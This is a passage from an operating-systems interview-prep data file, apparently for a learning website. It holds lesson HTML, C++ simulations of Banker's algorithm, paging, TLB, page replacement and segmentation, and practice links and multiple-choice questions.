deadlock <b>avoidance</b> is not used, we need a <b>detection</b> algorithm. It is similar to the safety algorithm but uses <b>current requests</b> instead of maximum needs:</p><ol class="learn-list"><li>Work = Available; Finish[i] = (Allocation[i] == 0) for all i.</li><li>Find process i where Finish[i] == false AND Request[i] &le; Work.</li><li>Work += Allocation[i]; Finish[i] = true; Go to step 2.</li><li>If Finish[i] == false for any i, those processes are <b>deadlocked</b>.</li></ol><div class="learn-tip"><b>Tip:</b> Banker\'s Algorithm is frequently asked in interviews with a numerical example. Practice computing the safe sequence quickly. The key insight is: we "simulate" running each process to completion and reclaiming its resources.</div></div><div class="learn-section"><div class="learn-h">Deadlock Recovery</div><p class="learn-p">If deadlock is detected, recovery strategies include:</p><ul class="learn-list"><li><b>Process termination:</b> Abort all deadlocked processes, or abort them one by one until the cycle is broken.</li><li><b>Resource preemption:</b> Forcibly take resources from some processes. Must handle: selecting a victim, rollback (total or partial), and preventing starvation (don\'t always pick the same victim).</li></ul><div class="learn-warn"><b>Warning:</b> Banker\'s Algorithm assumes that processes declare their maximum needs upfront and that the number of resources is fixed. These assumptions may not hold in real systems, which is one reason why most OS use the Ostrich approach instead.</div></div>',
          code: `// Banker's Algorithm Implementation in C++
#include <iostream>
#include <vector>
using namespace std;

class BankersAlgorithm {
    int n, m; // n processes, m resource types
    vector<vector<int>> max_need, allocation, need;
    vector<int> available;

public:
    BankersAlgorithm(int processes, int resources,
                     vector<vector<int>>& alloc,
                     vector<vector<int>>& maxNeed,
                     vector<int>& avail)
        : n(processes), m(resources), allocation(alloc),
          max_need(maxNeed), available(avail)
    {
        // Compute Need matrix: Need = Max - Allocation
        need.resize(n, vector<int>(m));
        for (int i = 0; i < n; i++)
            for (int j = 0; j < m; j++)
                need[i][j] = max_need[i][j] - allocation[i][j];
    }

    // Check if need[i] <= work for all resource types
    bool canFinish(int i, vector<int>& work) {
        for (int j = 0; j < m; j++)
            if (need[i][j] > work[j]) return false;
        return true;
    }

    // Safety Algorithm: returns true if system is in safe state
    bool isSafe(vector<int>& safeSequence) {
        vector<int> work = available;
        vector<bool> finish(n, false);
        safeSequence.clear();

        int count = 0;
        while (count < n) {
            bool found = false;
            for (int i = 0; i < n; i++) {
                if (!finish[i] && canFinish(i, work)) {
                    // Process i can finish; reclaim its resources
                    for (int j = 0; j < m; j++)
                        work[j] += allocation[i][j];
                    finish[i] = true;
                    safeSequence.push_back(i);
                    count++;
                    found = true;
                }
            }
            if (!found) return false; // No process can proceed -> unsafe
        }
        return true;
    }

    // Resource Request Algorithm
    bool requestResources(int pid, vector<int>& request) {
        // Step 1: Check request <= need
        for (int j = 0; j < m; j++) {
            if (request[j] > need[pid][j]) {
                cout << "Error: Request exceeds maximum claim." << endl;
                return false;
            }
        }
        // Step 2: Check request <= available
        for (int j = 0; j < m; j++) {
            if (request[j] > available[j]) {
                cout << "Process must wait (insufficient resources)." << endl;
                return false;
            }
        }
        // Step 3: Tentatively allocate
        for (int j = 0; j < m; j++) {
            available[j] -= request[j];
            allocation[pid][j] += request[j];
            need[pid][j] -= request[j];
        }
        // Step 4: Check safety
        vector<int> seq;
        if (isSafe(seq)) {
            cout << "Request GRANTED. Safe sequence: ";
            for (int p : seq) cout << "P" << p << " ";
            cout << endl;
            return true;
        } else {
            // Rollback
            for (int j = 0; j < m; j++) {
                available[j] += request[j];
                allocation[pid][j] -= request[j];
                need[pid][j] += request[j];
            }
            cout << "Request DENIED (would lead to unsafe state)." << endl;
            return false;
        }
    }

    void printState() {
        cout << "Process\\tAllocation\\tMax\\t\\tNeed" << endl;
        for (int i = 0; i < n; i++) {
            cout << "P" << i << "\\t";
            for (int j = 0; j < m; j++) cout << allocation[i][j] << " ";
            cout << "\\t\\t";
            for (int j = 0; j < m; j++) cout << max_need[i][j] << " ";
            cout << "\\t\\t";
            for (int j = 0; j < m; j++) cout << need[i][j] << " ";
            cout << endl;
        }
        cout << "Available: ";
        for (int j = 0; j < m; j++) cout << available[j] << " ";
        cout << endl;
    }
};

int main() {
    // Classic example: 5 processes, 3 resource types (A, B, C)
    vector<vector<int>> alloc = {{0,1,0},{2,0,0},{3,0,2},{2,1,1},{0,0,2}};
    vector<vector<int>> maxN  = {{7,5,3},{3,2,2},{9,0,2},{2,2,2},{4,3,3}};
    vector<int> avail = {3, 3, 2};

    BankersAlgorithm ba(5, 3, alloc, maxN, avail);
    ba.printState();

    cout << "\\n--- Safety Check ---" << endl;
    vector<int> seq;
    if (ba.isSafe(seq)) {
        cout << "System is SAFE. Sequence: ";
        for (int p : seq) cout << "P" << p << " ";
        cout << endl;
    }

    // P1 requests (1, 0, 2)
    cout << "\\n--- P1 requests (1, 0, 2) ---" << endl;
    vector<int> req = {1, 0, 2};
    ba.requestResources(1, req);

    return 0;
}`,
          problems: [
            ['Banker\'s Algorithm', 'https://www.geeksforgeeks.org/bankers-algorithm-in-operating-system-2/', 'Medium'],
            ['Deadlock Detection Algorithm', 'https://www.geeksforgeeks.org/deadlock-detection-algorithm-in-operating-system/', 'Medium'],
            ['Safe Sequence Practice', 'https://www.geeksforgeeks.org/resource-allocation-graph-rag-in-operating-system/', 'Hard'],
          ],
          mcqs: [
            {q: 'What is the time complexity of the Banker\'s Algorithm safety check?', o: ['O(n)', 'O(n * m)', 'O(n^2 * m)', 'O(n^2 * m^2)'], a: 2},
            {q: 'In the Banker\'s Algorithm, if the system is in an unsafe state, it means:', o: ['Deadlock has occurred', 'Deadlock will definitely occur', 'Deadlock might occur', 'The system must be restarted'], a: 2},
            {q: 'Which matrix in the Banker\'s Algorithm represents Max[i][j] - Allocation[i][j]?', o: ['Available', 'Request', 'Need', 'Work'], a: 2},
          ],
        },
      ],
    },

    // ===== TAB: MEMORY MANAGEMENT =====
    {
      id: 'mem', t: 'Memory Management',
      topics: [
        // ----- Topic 0: Paging & Page Tables -----
        {
          t: 'Paging & Page Tables',
          learn: '<div class="learn-section"><div class="learn-h">Why Paging?</div><p class="learn-p">Early memory management schemes like <b>contiguous allocation</b> suffer from <b>external fragmentation</b>: as processes are loaded and removed, free memory is broken into small, non-contiguous chunks. Even if total free memory is sufficient, a large process may not fit. <b>Compaction</b> can solve this but is very expensive.</p><p class="learn-p"><b>Paging</b> eliminates external fragmentation by dividing both physical memory and logical (virtual) memory into fixed-size blocks:</p><ul class="learn-list"><li><b>Page:</b> A fixed-size block of logical (virtual) memory. Typical sizes: 4 KB, 8 KB, 2 MB, 1 GB.</li><li><b>Frame:</b> A fixed-size block of physical memory, same size as a page.</li></ul><p class="learn-p">Any page can be mapped to any frame. The mapping is stored in a <b>page table</b>.</p></div><div class="learn-section"><div class="learn-h">Address Translation</div><p class="learn-p">A logical address generated by the CPU is divided into two parts:</p><table class="learn-table"><tr><th>Component</th><th>Bits</th><th>Description</th></tr><tr><td>Page Number (p)</td><td>Higher-order bits</td><td>Index into the page table</td></tr><tr><td>Page Offset (d)</td><td>Lower-order bits</td><td>Offset within the page</td></tr></table><p class="learn-p"><b>Translation process:</b></p><ol class="learn-list"><li>Extract page number <b>p</b> and offset <b>d</b> from the logical address.</li><li>Look up page table entry at index <b>p</b> to get the frame number <b>f</b>.</li><li>Physical address = <b>f * page_size + d</b> (or equivalently, concatenate f and d).</li></ol><div class="learn-code">// Given: page size = 4 KB = 4096 = 2^12\n// Logical address = 0x00003A7F\n// Page number = 0x00003A7F / 4096 = 0x3 (page 3)\n// Offset = 0x00003A7F % 4096 = 0xA7F\n// If page table[3] = frame 6:\n// Physical address = 6 * 4096 + 0xA7F = 0x6A7F</div></div><div class="learn-section"><div class="learn-h">Page Table Structure</div><p class="learn-p">Each <b>page table entry (PTE)</b> contains:</p><table class="learn-table"><tr><th>Field</th><th>Description</th></tr><tr><td>Frame Number</td><td>Physical frame where the page resides</td></tr><tr><td>Valid/Invalid Bit</td><td>1 if the page is in memory, 0 if not (page fault if accessed)</td></tr><tr><td>Protection Bits</td><td>Read/Write/Execute permissions</td></tr><tr><td>Dirty Bit (Modified)</td><td>1 if the page has been written to (used during page replacement)</td></tr><tr><td>Reference Bit (Accessed)</td><td>1 if the page has been recently accessed (used by replacement algorithms)</td></tr></table></div><div class="learn-section"><div class="learn-h">Translation Lookaside Buffer (TLB)</div><p class="learn-p">Accessing the page table for every memory access doubles the effective memory access time. The <b>TLB</b> is a small, fast, fully associative hardware cache that stores recently used page table entries.</p><p class="learn-p"><b>TLB hit:</b> Frame number is found directly in the TLB (no page table access needed). <b>TLB miss:</b> Must access the page table in memory, and the entry is loaded into the TLB.</p><p class="learn-p"><b>Effective Access Time (EAT):</b></p><div class="learn-code">EAT = hit_ratio * (TLB_access + memory_access)\n    + (1 - hit_ratio) * (TLB_access + memory_access + memory_access)\n\n// Example: TLB access = 10ns, Memory access = 100ns, hit ratio = 90%\n// EAT = 0.9 * (10 + 100) + 0.1 * (10 + 100 + 100)\n//     = 0.9 * 110 + 0.1 * 210 = 99 + 21 = 120ns</div><div class="learn-tip"><b>Tip:</b> Typical TLB hit ratios are 95-99% with 64-1024 entries. This makes paging practical despite the overhead.</div></div><div class="learn-section"><div class="learn-h">Multilevel Page Tables</div><p class="learn-p">For a 32-bit address space with 4 KB pages, the page table has 2^20 = 1M entries. At 4 bytes each, that\'s <b>4 MB per process</b> just for the page table &mdash; even if the process only uses a small fraction of its address space.</p><p class="learn-p"><b>Two-level page table:</b> The page table itself is paged. The logical address is split into:</p><div class="learn-code">// 32-bit address, 4 KB pages:\n// | 10 bits (outer page) | 10 bits (inner page) | 12 bits (offset) |\n//\n// Step 1: Use outer page number to index into outer page table\n// Step 2: Get the inner page table base address\n// Step 3: Use inner page number to index into inner page table\n// Step 4: Get frame number, combine with offset</div><p class="learn-p">Advantage: Only the outer page table (4 KB) must be in memory. Inner page tables are allocated on demand.</p></div><div class="learn-section"><div class="learn-h">Inverted Page Table</div><p class="learn-p">Instead of one page table per process, an <b>inverted page table</b> has one entry per physical frame. Each entry stores the process ID and page number mapped to that frame. This saves memory (one table for the whole system) but requires searching the table for translation. A hash table is typically used to speed up the search to <span class="learn-complexity">O(1)</span>.</p><div class="learn-warn"><b>Warning:</b> The inverted page table makes it harder to implement shared memory, because a single frame can only record one (pid, page) pair. Additional structures are needed for sharing.</div></div>',
          code: `// Page Table Simulation and Address Translation in C++
#include <iostream>
#include <vector>
#include <unordered_map>
#include <cmath>
using namespace std;

// Simple single-level page table simulation
class PageTable {
    int pageSize;      // In bytes
    int numPages;
    int pageBits;      // Number of bits for offset
    struct PTE {
        int frameNumber;
        bool valid;
        bool dirty;
        bool referenced;
    };
    vector<PTE> table;

public:
    PageTable(int virtualSize, int pSize) : pageSize(pSize) {
        numPages = virtualSize / pageSize;
        pageBits = (int)log2(pageSize);
        table.resize(numPages, {-1, false, false, false});
        cout << "Page Table: " << numPages << " pages, "
             << pageSize << " bytes/page, offset bits: "
             << pageBits << endl;
    }

    void mapPage(int pageNum, int frameNum) {
        if (pageNum < numPages) {
            table[pageNum] = {frameNum, true, false, false};
            cout << "Mapped page " << pageNum << " -> frame "
                 << frameNum << endl;
        }
    }

    int translate(int logicalAddr) {
        int pageNum = logicalAddr / pageSize;
        int offset = logicalAddr % pageSize;

        cout << "Logical addr " << logicalAddr << " -> page="
             << pageNum << ", offset=" << offset;

        if (pageNum >= numPages || !table[pageNum].valid) {
            cout << " -> PAGE FAULT!" << endl;
            return -1;
        }

        int physAddr = table[pageNum].frameNumber * pageSize + offset;
        table[pageNum].referenced = true;
        cout << " -> frame=" << table[pageNum].frameNumber
             << ", physical=" << physAddr << endl;
        return physAddr;
    }
};

// TLB simulation
class TLB {
    struct TLBEntry {
        int pageNum;
        int frameNum;
        bool valid;
    };
    vector<TLBEntry> entries;
    int size;
    int hits, misses;

public:
    TLB(int s) : size(s), hits(0), misses(0) {
        entries.resize(s, {-1, -1, false});
    }

    int lookup(int pageNum) {
        for (auto& e : entries) {
            if (e.valid && e.pageNum == pageNum) {
                hits++;
                return e.frameNum;
            }
        }
        misses++;
        return -1; // TLB miss
    }

    void insert(int pageNum, int frameNum) {
        // Simple FIFO replacement
        static int next = 0;
        entries[next] = {pageNum, frameNum, true};
        next = (next + 1) % size;
    }

    void printStats() {
        int total = hits + misses;
        cout << "TLB Stats: hits=" << hits << " misses=" << misses
             << " hit ratio=" << (total > 0 ? (double)hits/total*100 : 0)
             << "%" << endl;
    }
};

// Effective Access Time calculation
void calculateEAT(double tlbTime, double memTime, double hitRatio) {
    double eat = hitRatio * (tlbTime + memTime)
               + (1 - hitRatio) * (tlbTime + 2 * memTime);
    cout << "\\nEAT Calculation:" << endl;
    cout << "TLB time=" << tlbTime << "ns, Mem time=" << memTime
         << "ns, Hit ratio=" << hitRatio * 100 << "%" << endl;
    cout << "EAT = " << eat << "ns" << endl;
    cout << "Slowdown vs no paging: "
         << (eat / memTime - 1) * 100 << "%" << endl;
}

int main() {
    // Virtual memory = 64KB, page size = 4KB
    cout << "=== Page Table Demo ===" << endl;
    PageTable pt(65536, 4096); // 16 pages
    pt.mapPage(0, 5);
    pt.mapPage(1, 8);
    pt.mapPage(3, 2);
    pt.mapPage(7, 12);

    pt.translate(0);       // Page 0, offset 0
    pt.translate(4096);    // Page 1, offset 0
    pt.translate(8192);    // Page 2, NOT mapped -> page fault
    pt.translate(12500);   // Page 3, offset 308
    pt.translate(30000);   // Page 7, offset 1616

    // TLB Demo
    cout << "\\n=== TLB Demo ===" << endl;
    TLB tlb(4); // 4-entry TLB
    int pages[] = {3, 7, 3, 1, 3, 7, 0, 3};
    for (int p : pages) {
        int frame = tlb.lookup(p);
        if (frame == -1) {
            cout << "Page " << p << ": TLB MISS" << endl;
            tlb.insert(p, p * 3); // Simulated frame mapping
        } else {
            cout << "Page " << p << ": TLB HIT (frame " << frame << ")" << endl;
        }
    }
    tlb.printStats();

    // EAT Calculation
    calculateEAT(10, 100, 0.95);

    return 0;
}`,
          problems: [
            ['Paging in Operating System', 'https://www.geeksforgeeks.org/paging-in-operating-system/', 'Easy'],
            ['Page Table Entries', 'https://www.geeksforgeeks.org/page-table-entries-in-page-table/', 'Medium'],
            ['Multilevel Paging', 'https://www.geeksforgeeks.org/multilevel-paging-in-operating-system/', 'Hard'],
          ],
          mcqs: [
            {q: 'For a system with 32-bit logical addresses and 4 KB page size, how many entries are in the page table?', o: ['2^10', '2^12', '2^20', '2^32'], a: 2},
            {q: 'What is the purpose of the TLB?', o: ['To store recently used data from memory', 'To cache recently used page table entries for faster address translation', 'To manage disk I/O', 'To allocate physical frames'], a: 1},
            {q: 'If the TLB access time is 5ns, memory access time is 100ns, and TLB hit ratio is 80%, what is the effective access time?', o: ['84ns', '105ns', '126ns', '147ns'], a: 2},
          ],
        },
        // ----- Topic 1: Page Replacement Algorithms -----
        {
          t: 'Page Replacement Algorithms',
          learn: '<div class="learn-section"><div class="learn-h">Page Faults and Page Replacement</div><p class="learn-p">A <b>page fault</b> occurs when a process accesses a page that is not currently in physical memory. The OS must:</p><ol class="learn-list"><li>Trap to the OS (page fault interrupt).</li><li>Find the page on disk (swap space).</li><li>Find a free frame. If no free frame exists, select a <b>victim page</b> using a page replacement algorithm.</li><li>If the victim page is dirty, write it to disk first.</li><li>Load the desired page into the free frame.</li><li>Update the page table.</li><li>Restart the interrupted instruction.</li></ol><p class="learn-p">The goal is to minimize the <b>page fault rate</b>, as each page fault is very expensive (involves disk I/O).</p></div><div class="learn-section"><div class="learn-h">FIFO (First In First Out)</div><p class="learn-p">The simplest algorithm: replace the <b>oldest page</b> in memory. Implemented with a simple queue.</p><p class="learn-p"><b>Example:</b> Reference string: 7, 0, 1, 2, 0, 3, 0, 4, 2, 3, 0, 3, 2, 1, 2, 0, 1, 7, 0, 1. Frames = 3.</p><div class="learn-code">Frames: [7]      -> fault\n        [7,0]    -> fault\n        [7,0,1]  -> fault\n        [2,0,1]  -> fault (replace 7)\n        [2,0,1]  -> hit (0 already in)\n        [2,3,1]  -> fault (replace 0)\n        [2,3,0]  -> fault (replace 1)\n        [4,3,0]  -> fault (replace 2)\n        [4,2,0]  -> fault (replace 3)\n        [4,2,3]  -> fault (replace 0)\n        ...Total: 15 page faults</div><div class="learn-warn"><b>Warning:</b> FIFO suffers from <b>Belady\'s Anomaly</b>: increasing the number of frames can <b>increase</b> the number of page faults! This is counterintuitive and unique to FIFO.</div></div><div class="learn-section"><div class="learn-h">Optimal Page Replacement (OPT / MIN)</div><p class="learn-p">Replace the page that will <b>not be used for the longest time in the future</b>. This algorithm gives the <b>minimum possible</b> page faults. However, it requires knowledge of future references, making it impractical. It is used as a <b>benchmark</b> to compare other algorithms.</p><p class="learn-p">For the same reference string with 3 frames: <b>9 page faults</b> (optimal).</p></div><div class="learn-section"><div class="learn-h">LRU (Least Recently Used)</div><p class="learn-p"><b>LRU</b> replaces the page that has <b>not been used for the longest time in the past</b>. It approximates OPT by using recent history to predict future behavior.</p><p class="learn-p"><b>Implementation methods:</b></p><ul class="learn-list"><li><b>Counter-based:</b> Each page has a timestamp. On access, update the timestamp. Replace the page with the smallest timestamp. <span class="learn-complexity">O(n)</span> to find victim.</li><li><b>Stack-based:</b> Maintain a stack of page numbers. On access, move the page to the top. The bottom of the stack is the LRU page. Use a doubly-linked list + hash map for <span class="learn-complexity">O(1)</span> operations.</li></ul><p class="learn-p">For the same reference string with 3 frames: <b>12 page faults</b>.</p><div class="learn-tip"><b>Tip:</b> LRU does NOT suffer from Belady\'s Anomaly because it is a <b>stack algorithm</b>: the set of pages in memory with n+1 frames is always a superset of those with n frames.</div></div><div class="learn-section"><div class="learn-h">LRU Approximation Algorithms</div><p class="learn-p">True LRU is expensive to implement in hardware. Practical systems use approximations:</p><p class="learn-p"><b>Clock Algorithm (Second Chance):</b></p><ol class="learn-list"><li>Arrange frames in a circular buffer with a pointer.</li><li>Each page has a <b>reference bit</b> (set to 1 when accessed by hardware).</li><li>When a replacement is needed, check the page pointed to by the clock hand:</li><li>If reference bit = 1: Set it to 0 (give a second chance), advance the pointer.</li><li>If reference bit = 0: Replace this page.</li></ol><p class="learn-p">The clock algorithm approximates LRU with <span class="learn-complexity">O(1)</span> amortized cost per replacement.</p></div><div class="learn-section"><div class="learn-h">Comparison of Page Replacement Algorithms</div><table class="learn-table"><tr><th>Algorithm</th><th>Page Faults (example)</th><th>Belady\'s Anomaly?</th><th>Practical?</th><th>Complexity</th></tr><tr><td>FIFO</td><td>15</td><td>Yes</td><td>Yes (simple)</td><td><span class="learn-complexity">O(1)</span></td></tr><tr><td>OPT</td><td>9</td><td>No</td><td>No (needs future)</td><td><span class="learn-complexity">O(n)</span></td></tr><tr><td>LRU</td><td>12</td><td>No</td><td>Expensive hardware</td><td><span class="learn-complexity">O(1)</span> with stack</td></tr><tr><td>Clock</td><td>~LRU</td><td>No</td><td>Yes (most common)</td><td><span class="learn-complexity">O(1)</span> amortized</td></tr></table><div class="learn-tip"><b>Tip:</b> In interviews, practice tracing through a reference string with each algorithm. The most commonly asked are FIFO, LRU, and OPT. Be ready to explain Belady\'s anomaly and why LRU is preferred over FIFO.</div></div>',
          code: `// Page Replacement Algorithms: FIFO, LRU, Optimal
#include <iostream>
#include <vector>
#include <queue>
#include <unordered_set>
#include <unordered_map>
#include <list>
#include <climits>
using namespace std;

// FIFO Page Replacement
int fifo(vector<int>& pages, int frames) {
    queue<int> q;
    unordered_set<int> inMemory;
    int faults = 0;

    cout << "=== FIFO (frames=" << frames << ") ===" << endl;
    for (int page : pages) {
        if (inMemory.find(page) == inMemory.end()) {
            faults++;
            if ((int)q.size() >= frames) {
                int victim = q.front(); q.pop();
                inMemory.erase(victim);
                cout << "  Replace " << victim << " with " << page << endl;
            } else {
                cout << "  Load " << page << endl;
            }
            q.push(page);
            inMemory.insert(page);
        } else {
            cout << "  Hit: " << page << endl;
        }
    }
    cout << "Total faults: " << faults << endl;
    return faults;
}

// LRU Page Replacement (using list + map for O(1))
int lru(vector<int>& pages, int frames) {
    list<int> lruList;          // Most recent at front
    unordered_map<int, list<int>::iterator> pageMap;
    int faults = 0;

    cout << "\\n=== LRU (frames=" << frames << ") ===" << endl;
    for (int page : pages) {
        if (pageMap.find(page) == pageMap.end()) {
            faults++;
            if ((int)lruList.size() >= frames) {
                int victim = lruList.back(); // LRU page
                lruList.pop_back();
                pageMap.erase(victim);
                cout << "  Replace " << victim << " with " << page << endl;
            } else {
                cout << "  Load " << page << endl;
            }
        } else {
            cout << "  Hit: " << page << endl;
            lruList.erase(pageMap[page]); // Remove from current position
        }
        lruList.push_front(page);         // Add to front (most recent)
        pageMap[page] = lruList.begin();
    }
    cout << "Total faults: " << faults << endl;
    return faults;
}

// Optimal Page Replacement
int optimal(vector<int>& pages, int frames) {
    unordered_set<int> inMemory;
    vector<int> memFrames;
    int faults = 0;

    cout << "\\n=== Optimal (frames=" << frames << ") ===" << endl;
    for (int i = 0; i < (int)pages.size(); i++) {
        if (inMemory.find(pages[i]) == inMemory.end()) {
            faults++;
            if ((int)memFrames.size() >= frames) {
                // Find page not used for longest time in future
                int farthest = -1, victimIdx = 0;
                for (int j = 0; j < (int)memFrames.size(); j++) {
                    int nextUse = INT_MAX;
                    for (int k = i + 1; k < (int)pages.size(); k++) {
                        if (pages[k] == memFrames[j]) {
                            nextUse = k; break;
                        }
                    }
                    if (nextUse > farthest) {
                        farthest = nextUse;
                        victimIdx = j;
                    }
                }
                cout << "  Replace " << memFrames[victimIdx]
                     << " with " << pages[i] << endl;
                inMemory.erase(memFrames[victimIdx]);
                memFrames[victimIdx] = pages[i];
            } else {
                memFrames.push_back(pages[i]);
                cout << "  Load " << pages[i] << endl;
            }
            inMemory.insert(pages[i]);
        } else {
            cout << "  Hit: " << pages[i] << endl;
        }
    }
    cout << "Total faults: " << faults << endl;
    return faults;
}

int main() {
    vector<int> pages = {7,0,1,2,0,3,0,4,2,3,0,3,2,1,2,0,1,7,0,1};
    int frames = 3;

    cout << "Reference string: ";
    for (int p : pages) cout << p << " ";
    cout << "\\n" << endl;

    int f1 = fifo(pages, frames);
    int f2 = lru(pages, frames);
    int f3 = optimal(pages, frames);

    cout << "\\n=== Summary ===" << endl;
    cout << "FIFO:    " << f1 << " faults" << endl;
    cout << "LRU:     " << f2 << " faults" << endl;
    cout << "Optimal: " << f3 << " faults (theoretical minimum)" << endl;

    return 0;
}`,
          problems: [
            ['LRU Cache (LeetCode 146)', 'https://leetcode.com/problems/lru-cache/', 'Medium'],
            ['Page Replacement Algorithms', 'https://www.geeksforgeeks.org/page-replacement-algorithms-in-operating-systems/', 'Medium'],
            ['Belady\'s Anomaly', 'https://www.geeksforgeeks.org/beladys-anomaly-in-page-replacement-algorithms/', 'Easy'],
            ['LFU Cache (LeetCode 460)', 'https://leetcode.com/problems/lfu-cache/', 'Hard'],
          ],
          mcqs: [
            {q: 'Which page replacement algorithm can exhibit Belady\'s Anomaly?', o: ['LRU', 'Optimal', 'FIFO', 'Clock'], a: 2},
            {q: 'Which algorithm gives the minimum number of page faults?', o: ['LRU', 'FIFO', 'Clock', 'Optimal (OPT)'], a: 3},
            {q: 'In the Clock (Second Chance) algorithm, what happens when the clock hand encounters a page with reference bit = 1?', o: ['The page is replaced immediately', 'The reference bit is set to 0 and the hand moves on', 'The page is moved to the end of the queue', 'A page fault is generated'], a: 1},
          ],
        },
        {
          t: 'Segmentation & Segmented Paging',
          learn: '<div class="learn-section"><div class="learn-h">What is Segmentation?</div><p class="learn-p"><b>Segmentation</b> divides a process\'s address space into <b>logical segments</b> — variable-sized units that reflect the programmer\'s view: code segment, data segment, stack, heap, etc. Each segment has a name (or number) and a length.</p><p class="learn-p">Unlike paging (which divides memory into fixed-size pages regardless of logical structure), segmentation preserves the logical grouping of related data.</p></div><div class="learn-section"><div class="learn-h">Segment Table</div><p class="learn-p">Each process has a <b>segment table</b> where each entry contains:</p><table class="learn-table"><tr><th>Field</th><th>Purpose</th></tr><tr><td>Base</td><td>Starting physical address of the segment</td></tr><tr><td>Limit</td><td>Length of the segment</td></tr></table><p class="learn-p"><b>Address translation:</b> A logical address is a pair <code>(segment_number, offset)</code>. If <code>offset &lt; limit</code>, the physical address = <code>base + offset</code>. If <code>offset ≥ limit</code>, a <b>segmentation fault</b> (trap) occurs.</p><div class="learn-code">Logical address: (segment 2, offset 400)\nSegment table entry 2: base=4300, limit=1000\nSince 400 &lt; 1000 → Physical address = 4300 + 400 = 4700\n\nLogical address: (segment 2, offset 1200)\nSince 1200 ≥ 1000 → SEGMENTATION FAULT</div></div><div class="learn-section"><div class="learn-h">Paging vs Segmentation</div><table class="learn-table"><tr><th>Feature</th><th>Paging</th><th>Segmentation</th></tr><tr><td>Division size</td><td>Fixed (page size)</td><td>Variable (segment length)</td></tr><tr><td>User view</td><td>Transparent to user</td><td>Reflects logical structure</td></tr><tr><td>Fragmentation</td><td>Internal (last page may not be full)</td><td>External (gaps between segments)</td></tr><tr><td>Address</td><td>(page_number, offset)</td><td>(segment_number, offset)</td></tr><tr><td>Sharing</td><td>Harder (page boundaries)</td><td>Natural (share code segment)</td></tr></table></div><div class="learn-section"><div class="learn-h">Segmented Paging</div><p class="learn-p"><b>Segmented paging</b> combines both: each segment is divided into pages. Address translation is two-level: segment number → segment\'s page table → page frame.</p><div class="learn-code">Logical address: (segment, page, offset)\n1. Segment table[segment] → page table base\n2. Page table[page] → frame number\n3. Physical address = frame * page_size + offset</div><p class="learn-p">This gives the logical organization of segmentation with the fixed-size allocation benefits of paging (no external fragmentation).</p><div class="learn-tip"><b>Tip:</b> Intel x86 (32-bit) used segmented paging. Modern 64-bit systems mostly use flat paging — segmentation is effectively disabled but still exists in the architecture.</div></div>',
          code: `#include <iostream>
#include <vector>
using namespace std;

struct SegmentEntry {
    int base;
    int limit;
};

int translateAddress(vector<SegmentEntry>& segTable, int segNum, int offset) {
    if (segNum < 0 || segNum >= (int)segTable.size()) {
        cout << "Invalid segment number: " << segNum << endl;
        return -1;
    }
    if (offset < 0 || offset >= segTable[segNum].limit) {
        cout << "SEGMENTATION FAULT: offset " << offset
             << " exceeds limit " << segTable[segNum].limit << endl;
        return -1;
    }
    return segTable[segNum].base + offset;
}

int main() {
    // Segment table: {base, limit}
    vector<SegmentEntry> segTable = {
        {1400, 1000},  // Seg 0: Code segment
        {6300, 400},   // Seg 1: Data segment
        {4300, 1000},  // Seg 2: Stack segment
        {3200, 1100},  // Seg 3: Heap segment
    };

    cout << "Segment Table:\\n";
    cout << "Seg\\tBase\\tLimit\\n";
    for (int i = 0; i < (int)segTable.size(); i++)
        cout << i << "\\t" << segTable[i].base << "\\t" << segTable[i].limit << "\\n";

    // Valid translations
    cout << "\\n(Seg 2, Offset 400) -> " << translateAddress(segTable, 2, 400) << "\\n";
    cout << "(Seg 0, Offset 500) -> " << translateAddress(segTable, 0, 500) << "\\n";

    // Segmentation fault
    cout << "(Seg 1, Offset 500) -> ";
    translateAddress(segTable, 1, 500);

    return 0;
}`,
          problems: [
            ['Memory Segmentation - GFG', 'https://www.geeksforgeeks.org/segmentation-in-operating-system/', 'Medium'],
            ['Paging vs Segmentation - GFG', 'https://www.geeksforgeeks.org/difference-between-paging-and-segmentation/', 'Easy'],
            ['Memory Management MCQs - GFG', 'https://www.geeksforgeeks.org/operating-systems-gq/memory-management-gq/', 'Medium']
          ],
          mcqs: [
            {q: 'What type of fragmentation does segmentation suffer from?', o: ['Internal fragmentation', 'External fragmentation', 'Both', 'Neither'], a: 1},
            {q: 'A logical address in segmentation consists of:', o: ['Page number + offset', 'Segment number + offset', 'Frame number + offset', 'Base address + limit'], a: 1},
            {q: 'What causes a segmentation fault?', o: ['Page not in memory', 'Offset exceeds segment limit', 'TLB miss', 'Cache miss'], a: 1}
          ]
        },
      ],
    },

    // ===== TAB: VIRTUAL MEMORY =====
    {
      id: 'vm', t: 'Virtual Memory',
      topics: [
        // ----- Topic 0: Virtual Memory & Demand Paging -----
        {
          t: 'Virtual Memory & Demand Paging',
          learn: '<div class="learn-section"><div class="learn-h">What is Virtual Memory?</div><p class="learn-p"><b>Virtual memory</b> is a memory management technique that gives each process the illusion of having a large, contiguous address space, even if physical memory (RAM) is much smaller. It achieves this by using disk space (swap space) as an extension of RAM.</p><p class="learn-p"><b>Key benefits:</b></p><ul class="learn-list"><li><b>Larger address space:</b> Processes can use more memory than physically available.</li><li><b>Isolation:</b> Each process has its own virtual address space, protected from other processes.</li><li><b>Efficient memory use:</b> Only the actively used pages need to be in RAM; the rest stay on disk.</li><li><b>Simplified linking and loading:</b> Programs can be loaded at any physical address.</li><li><b>Shared libraries:</b> Multiple processes can share the same physical copy of a shared library, each mapping it into their own virtual space.</li></ul></div><div class="learn-section"><div class="learn-h">Demand Paging</div><p class="learn-p"><b>Demand paging</b> is the most common implementation of virtual memory. Pages are loaded into memory <b>only when they are accessed</b> (on demand), not in advance.</p><p class="learn-p"><b>Lazy swapper (pager):</b> Never brings a page into memory unless it is needed. Initially, the page table marks all pages as <b>invalid</b>. When a page is accessed:</p><ol class="learn-list"><li>The CPU generates a logical address.</li><li>The MMU checks the page table. If the valid bit is 0 &rarr; <b>page fault</b>.</li><li>The OS traps, finds the page on disk, loads it into a free frame, updates the page table (valid = 1, frame number set), and restarts the instruction.</li></ol><div class="learn-code">// Page fault handling pseudocode:\n1. Trap to OS\n2. Save user registers and process state\n3. Determine that the interrupt was a page fault\n4. Check that the page reference was legal\n5. Find a free frame (or use page replacement)\n6. Schedule disk I/O to read the page into the frame\n7. When I/O completes, update the page table\n8. Restart the instruction that caused the page fault</div></div><div class="learn-section"><div class="learn-h">Performance of Demand Paging</div><p class="learn-p">The effective access time with demand paging depends on the <b>page fault rate (p)</b>:</p><div class="learn-code">EAT = (1 - p) * memory_access_time + p * page_fault_service_time\n\n// Typical values:\n// memory_access_time = 200 ns\n// 